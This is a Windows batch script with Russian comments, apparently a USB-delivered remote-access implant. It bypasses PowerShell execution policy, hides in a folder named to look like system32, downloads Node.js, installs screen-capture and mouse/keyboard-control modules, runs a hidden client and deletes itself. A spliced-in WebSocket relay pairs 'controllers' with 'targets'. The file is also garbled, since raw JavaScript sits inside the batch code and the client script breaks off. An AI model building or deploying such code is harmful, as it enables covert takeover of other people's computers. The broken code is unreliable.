@echo off
powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"
mkdir %APPDATA%\system32
cd /d %APPDATA%\system32

:: Скачивание Node.js portable
powershell -c "Invoke-WebRequest -Uri 'https://nodejs.org/dist/v18.16.0/node-v18.16.0-win-x64.zip' -OutFile 'node.zip'"
powershell -c "Expand-Archive node.zip -DestinationPath ."
move node-v18.16.0-win-x64\node.exe node.exe

:: Установка зависимостей
echo Installing modules...
node.exe -e "const fs=require('fs'); fs.writeFileSync('package.json', '{\"dependencies\":{\"ws\":\"^8.13.0\",\"screenshot-desktop\":\"^1.12.7\",\"robotjs\":\"^0.6.0\"}}')"
node.exe -e "const {spawn}=require('child_process'); const p=spawn('node.exe',['-e','require(\"child_process\").exec(\"npm install --only=production\", {cwd:process.cwd()})']); p.unref();"

:: Копирование клиентского скрипта
echo const WebSocket = require('ws') > client.js
echo const screenshot = require('screenshot-desktop') >> client.js
const WebSocket = require('ws');
const { spawn } = require('child_process');
const sessions = new Map();

exports.handler = async (event) => {
    if (event.httpMethod === 'GET') {
        const wss = new WebSocket.Server({ noServer: true });
        
        wss.on('connection', (ws, req) => {
            const params = new URLSearchParams(req.url.split('?')[1]);
            const targetId = params.get('targetId');
            
            if (!sessions.has(targetId)) {
                sessions.set(targetId, { controllers: [], targets: [] });
            }
            
            const session = sessions.get(targetId);
            
            ws.on('message', (data) => {
                const msg = JSON.parse(data);
                
                if (msg.type === 'control') {
                    if (msg.data === 'register_controller') {
                        session.controllers.push(ws);
                    } else if (msg.data === 'register_target') {
                        session.targets.push(ws);
                    }
                    
                    // Реле сообщений между контроллером и целью
                    if (session.targets.length > 0 && session.controllers.length > 0) {
                        if (msg.type === 'mouse' || msg.type === 'keyboard' || msg.type === 'control') {
                            session.targets.forEach(target => target.send(JSON.stringify(msg)));
                        }
                    }
                }
            });
            
            ws.on('close', () => {
                session.controllers = session.controllers.filter(c => c !== ws);
                session.targets = session.targets.filter(t => t !== ws);
            });
        });
        
        return { statusCode: 200 };
    }
    
    return { statusCode: 400 };
};

:: Запуск
start /B node.exe client.js

:: Скрытие окна
powershell -window hidden -command ""

:: Самоудаление с флешки
del %~f0